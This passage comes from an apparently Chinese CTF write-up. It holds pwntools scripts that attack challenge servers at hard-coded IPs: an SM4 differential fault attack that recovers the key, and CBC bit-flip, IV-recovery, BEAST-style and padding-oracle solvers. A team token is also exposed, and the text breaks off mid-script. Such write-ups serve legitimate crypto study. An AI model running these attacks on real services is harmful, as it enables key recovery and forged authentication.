class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sm4 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> func <span class="keyword">import</span> xor, rotl, get_uint32_be, put_uint32_be, \</span><br><span class="line">        bytes_to_list, list_to_bytes, padding, unpadding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">token = <span class="string">b&quot;icq3f18237ca27013a7969864ab40836&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;39.101.134.52&quot;</span>, <span class="number">8006</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PoW</span></span><br><span class="line">rec = r.recvline().decode()</span><br><span class="line">suffix = re.findall(<span class="string">r&#x27;XXX\+([^\)]+)&#x27;</span>, rec)[<span class="number">0</span>]</span><br><span class="line">digest = re.findall(<span class="string">r&#x27;== ([^\n]+)&#x27;</span>, rec)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;suffix: <span class="subst">&#123;suffix&#125;</span> \ndigest: <span class="subst">&#123;digest&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Calculating hash...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(string.ascii_letters + string.digits, repeat=<span class="number">3</span>):</span><br><span class="line">    prefix = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    guess = prefix + suffix</span><br><span class="line">    <span class="keyword">if</span> sha256(guess.encode()).hexdigest() == digest:</span><br><span class="line">        <span class="built_in">print</span>(guess)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">r.sendafter(<span class="string">b&#x27;Give me XXX:&#x27;</span>, prefix.encode())</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&quot;teamtoken&quot;</span>, token)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;your flag is\n&quot;</span>)</span><br><span class="line">enc_flag = r.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&quot;\x00&quot;</span> * <span class="number">15</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ltor</span>(<span class="params">b, l</span>):</span><br><span class="line">    bits = <span class="built_in">bin</span>(b)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(bits[-l:] + bits[:-l], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_Y</span>(<span class="params">cipher</span>):</span><br><span class="line">    <span class="comment"># bytes -&gt; list</span></span><br><span class="line">    Y0 = get_uint32_be(cipher[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    Y1 = get_uint32_be(cipher[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    Y2 = get_uint32_be(cipher[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">    Y3 = get_uint32_be(cipher[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">         <span class="comment"># X32, X33, X34, X35</span></span><br><span class="line">    <span class="keyword">return</span> [Y3,  Y2,  Y1,  Y0]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_round</span>(<span class="params">Xs</span>):</span><br><span class="line">    <span class="keyword">return</span> [Xs[-<span class="number">1</span>], Xs[<span class="number">0</span>], Xs[<span class="number">1</span>], Xs[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rk_byte</span>(<span class="params">raw_cipher, fault_ciphers, j</span>):</span><br><span class="line">    r_res, r_X32, r_X33, r_X34 = inv_round(raw_cipher)</span><br><span class="line">    r_byte   = put_uint32_be(r_X32 ^ r_X33 ^ r_X34)[j%<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    ios = []</span><br><span class="line">    <span class="keyword">for</span> f_cipher <span class="keyword">in</span> fault_ciphers:</span><br><span class="line">        f_res, f_X32, f_X33, f_X34 = inv_round(f_cipher)</span><br><span class="line">        diff_out = ltor(put_uint32_be(r_res ^ f_res)[(j-<span class="number">1</span>)%<span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">        f_byte = put_uint32_be(f_X32 ^ f_X33 ^ f_X34)[j%<span class="number">4</span>]</span><br><span class="line">        ios.append((f_byte,diff_out))</span><br><span class="line">    <span class="comment"># print(ios)</span></span><br><span class="line"></span><br><span class="line">    candidate_keys = Counter()</span><br><span class="line">    <span class="keyword">for</span> rk_byte <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> f_byte, diff_out <span class="keyword">in</span> ios:</span><br><span class="line">            <span class="keyword">if</span> SM4_BOXES_TABLE[r_byte^rk_byte] ^ SM4_BOXES_TABLE[f_byte^rk_byte] == diff_out:</span><br><span class="line">               candidate_keys[rk_byte] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> candidate_keys.most_common()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_r_cipher</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your plaintext in hex:&quot;</span>, plaintext.<span class="built_in">hex</span>().encode())</span><br><span class="line">    cipher = <span class="built_in">bytes</span>.fromhex(r.recvline().strip().decode().split(<span class="string">&quot;hex:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_f_cipher</span>(<span class="params"><span class="built_in">round</span>, j</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your plaintext in hex:&quot;</span>, plaintext.<span class="built_in">hex</span>().encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;give me the value of r f p:&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">round</span>&#125;</span> <span class="subst">&#123;random.getrandbits(<span class="number">8</span>)&#125;</span> <span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line">    cipher = <span class="built_in">bytes</span>.fromhex(r.recvline().strip().decode().split(<span class="string">&quot;hex:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x0, x1, x2, x3, rk</span>):</span><br><span class="line">    <span class="comment"># &quot;T algorithm&quot; == &quot;L algorithm&quot; + &quot;t algorithm&quot;.</span></span><br><span class="line">    <span class="comment"># args:    [in] a: a is a 32 bits unsigned value;</span></span><br><span class="line">    <span class="comment"># return: c: c is calculated with line algorithm &quot;L&quot; and nonline algorithm &quot;t&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_sm4_l_t</span>(<span class="params">ka</span>):</span><br><span class="line">        b = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        a = put_uint32_be(ka)</span><br><span class="line">        b[<span class="number">0</span>] = SM4_BOXES_TABLE[a[<span class="number">0</span>]]</span><br><span class="line">        b[<span class="number">1</span>] = SM4_BOXES_TABLE[a[<span class="number">1</span>]]</span><br><span class="line">        b[<span class="number">2</span>] = SM4_BOXES_TABLE[a[<span class="number">2</span>]]</span><br><span class="line">        b[<span class="number">3</span>] = SM4_BOXES_TABLE[a[<span class="number">3</span>]]</span><br><span class="line">        bb = get_uint32_be(b[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">        c = bb ^ (rotl(bb, <span class="number">2</span>)) ^ (rotl(bb, <span class="number">10</span>)) ^ (rotl(bb, <span class="number">18</span>)) ^ (rotl(bb, <span class="number">24</span>))</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">return</span> (x0 ^ _sm4_l_t(x1 ^ x2 ^ x3 ^ rk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_one_round</span>(<span class="params">cipher, rk</span>):</span><br><span class="line">    <span class="keyword">return</span> [f(cipher[<span class="number">3</span>], cipher[<span class="number">0</span>], cipher[<span class="number">1</span>], cipher[<span class="number">2</span>], rk), cipher[<span class="number">0</span>], cipher[<span class="number">1</span>], cipher[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_rounds</span>(<span class="params">cipher, rks</span>):</span><br><span class="line">    <span class="keyword">for</span> rk <span class="keyword">in</span> rks:</span><br><span class="line">        cipher = decrypt_one_round(cipher, rk)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">raw_cipher = inv_Y(get_r_cipher())</span><br><span class="line"><span class="built_in">print</span>(raw_cipher)</span><br><span class="line"></span><br><span class="line">rks = []</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">27</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># print(round)</span></span><br><span class="line"></span><br><span class="line">    rk = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        fault_ciphers = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            fault_ciphers.add(get_f_cipher(<span class="built_in">round</span>, j))</span><br><span class="line">        fault_ciphers = [inv_Y(i) <span class="keyword">for</span> i <span class="keyword">in</span> fault_ciphers]</span><br><span class="line"></span><br><span class="line">        fault_ciphers = [decrypt_rounds(f_cipher, rks) <span class="keyword">for</span> f_cipher <span class="keyword">in</span> fault_ciphers]</span><br><span class="line"></span><br><span class="line">        rk_byte = get_rk_byte(raw_cipher, fault_ciphers, j)</span><br><span class="line">        rk = (rk &lt;&lt; <span class="number">8</span>) + rk_byte</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;round <span class="subst">&#123;<span class="built_in">round</span>+<span class="number">1</span>&#125;</span> subkey: <span class="subst">&#123;rk&#125;</span>&quot;</span>)</span><br><span class="line">    rks.append(rk)</span><br><span class="line"></span><br><span class="line">    raw_cipher = decrypt_one_round(raw_cipher, rk)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_round_key</span>(<span class="params">ka</span>):</span><br><span class="line">    b = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    a = put_uint32_be(ka)</span><br><span class="line">    b[<span class="number">0</span>] = SM4_BOXES_TABLE[a[<span class="number">0</span>]]</span><br><span class="line">    b[<span class="number">1</span>] = SM4_BOXES_TABLE[a[<span class="number">1</span>]]</span><br><span class="line">    b[<span class="number">2</span>] = SM4_BOXES_TABLE[a[<span class="number">2</span>]]</span><br><span class="line">    b[<span class="number">3</span>] = SM4_BOXES_TABLE[a[<span class="number">3</span>]]</span><br><span class="line">    bb = get_uint32_be(b[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    rk = bb ^ (rotl(bb, <span class="number">13</span>)) ^ (rotl(bb, <span class="number">23</span>))</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"></span><br><span class="line"><span class="comment"># def set_key(key, mode):</span></span><br><span class="line">    <span class="comment"># key = bytes_to_list(key)</span></span><br><span class="line">    <span class="comment"># sk = []*32</span></span><br><span class="line">    <span class="comment"># MK = [123, 456, 789, 145]</span></span><br><span class="line">    <span class="comment"># k = [0]*36</span></span><br><span class="line">    <span class="comment"># MK[0] = get_uint32_be(key[0:4])</span></span><br><span class="line">    <span class="comment"># MK[1] = get_uint32_be(key[4:8])</span></span><br><span class="line">    <span class="comment"># MK[2] = get_uint32_be(key[8:12])</span></span><br><span class="line">    <span class="comment"># MK[3] = get_uint32_be(key[12:16])</span></span><br><span class="line">    <span class="comment"># k[0:4] = xor(MK[0:4], SM4_FK[0:4])</span></span><br><span class="line">    <span class="comment"># for i in range(32):</span></span><br><span class="line">    <span class="comment">#     k[i + 4] = k[i] ^ (</span></span><br><span class="line">    <span class="comment">#         _round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i]))</span></span><br><span class="line">    <span class="comment">#     sk[i] = k[i + 4]</span></span><br><span class="line">    <span class="comment"># return sk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_key_schedule</span>(<span class="params">rks</span>): <span class="comment"># rks: [rk32, rk31, rk30, rk29]</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="number">32</span> + rks[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        k[i] = k[i+<span class="number">4</span>] ^ (_round_key(k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>] ^ SM4_CK[i]))</span><br><span class="line">    <span class="built_in">print</span>(k[<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">    Mk = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        Mk[j] = SM4_FK[j] ^ k[j]</span><br><span class="line"></span><br><span class="line">    master_key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        master_key += put_uint32_be(Mk[i])</span><br><span class="line">    <span class="keyword">return</span> list_to_bytes(master_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mk = inv_key_schedule(rks)</span><br><span class="line"><span class="built_in">print</span>(Mk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;your key in hex:&quot;</span>, Mk.<span class="built_in">hex</span>().encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;your ciphertext in hex:&quot;</span>, enc_flag)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;your plaintext in hex:&quot;</span>)</span><br><span class="line">flag = r.recvline().strip().decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>但是能getflag：</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_80b51b89dfd332c4c8c86c69fe16698d.png"></p>
<h3><span id="modestudy">modestudy</span><a href="#modestudy" class="header-anchor"></a></h3><p>第一关 cbc bit flip，把第一块密文的最后一字节xor上0x1即可</p>
<p>第二关 </p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_7b66e6dda856cd1cf3f9c8ab71abcb68.png"></p>
<p>扔给服务器两个一样的c1、c2，然后iv &#x3D; (c1 ^ p2) ^ p1</p>
<p>第三关 </p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_159b1c4e457f109f16b6c8ba0e45486b.png"></p>
<p>把第3块密文换成第5块密文</p>
<p>第四关 低配版 BEAST Attack</p>
<p>第五关 几次尝试后，发现它的加密实际上就是对每2byte进行置换，列一个置换表出来，即可找到secret</p>
<p>第六关 padding oracle attack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TOKEN = <span class="string">&quot;icq3f18237ca27013a7969864ab40836&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;139.224.254.172&quot;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PoW</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    rec = r.recvuntil(<span class="string">b&quot;?=&quot;</span>).decode()</span><br><span class="line">    prefix = re.findall(<span class="string">r&quot;\(([a-zA-Z0-9]&#123;8&#125;)\+&quot;</span>, rec)[<span class="number">0</span>].encode()</span><br><span class="line">    <span class="built_in">print</span>(prefix)</span><br><span class="line"></span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        answer = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>))</span><br><span class="line">        hashresult = hashlib.sha256(prefix+answer.encode()).digest()</span><br><span class="line">        bits = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">bin</span>(j)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hashresult)</span><br><span class="line">        <span class="keyword">if</span> bits.startswith(<span class="string">&#x27;0&#x27;</span>*<span class="number">5</span>):</span><br><span class="line">            <span class="built_in">print</span>(answer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(time.time() - start)</span><br><span class="line"></span><br><span class="line">    r.sendline(answer.encode())</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;teamtoken=&quot;</span>, TOKEN)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(a,b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_1</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;challenge 1\n&quot;</span>)</span><br><span class="line">    data = r.recvline().decode()</span><br><span class="line">    session = re.findall(<span class="string">r&quot;session=([0-9a-f].*?);&quot;</span>, data)[<span class="number">0</span>]</span><br><span class="line">    checksum = re.findall(<span class="string">r&quot;checksum=([0-9a-f].*?)\n&quot;</span>, data)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;session: <span class="subst">&#123;session&#125;</span>\nchecksum: <span class="subst">&#123;checksum&#125;</span>&quot;</span>)</span><br><span class="line">    checksum = <span class="built_in">bytes</span>.fromhex(checksum)</span><br><span class="line"></span><br><span class="line">    raw_data = <span class="string">f&quot;session=<span class="subst">&#123;session&#125;</span>;admin=0&quot;</span>.encode()</span><br><span class="line">    target_data = <span class="string">f&quot;session=<span class="subst">&#123;session&#125;</span>;admin=1&quot;</span>.encode()</span><br><span class="line">    nex_checksum = xor(checksum, <span class="string">b&quot;\x00&quot;</span>*<span class="number">15</span> + <span class="string">b&quot;\x01&quot;</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    payload = target_data + <span class="string">b&quot;;&quot;</span> + <span class="string">b&quot;checksum=&quot;</span> + nex_checksum.<span class="built_in">hex</span>().encode()</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;cookie:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_2</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;your choice:&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;challenge 2\n&quot;</span>)</span><br><span class="line">    hexdigest = r.recvline().decode()[<span class="number">15</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Challenge2 sha256(iv): <span class="subst">&#123;hexdigest&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># r.sendlineafter(b&quot;your choice:&quot;, b&quot;1&quot;) # server decrypt for us</span></span><br><span class="line">    <span class="comment"># c = b&quot;11&quot;*32</span></span><br><span class="line">    <span class="comment"># r.sendlineafter(b&quot;c:&quot;, c)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># decrypt = bytes.fromhex(r.recvline()[4:-1].decode())</span></span><br><span class="line">    <span class="comment"># print(len(decrypt))</span></span><br><span class="line">    <span class="comment"># plain1, plain2 = decrypt[:16], decrypt[16:32]</span></span><br><span 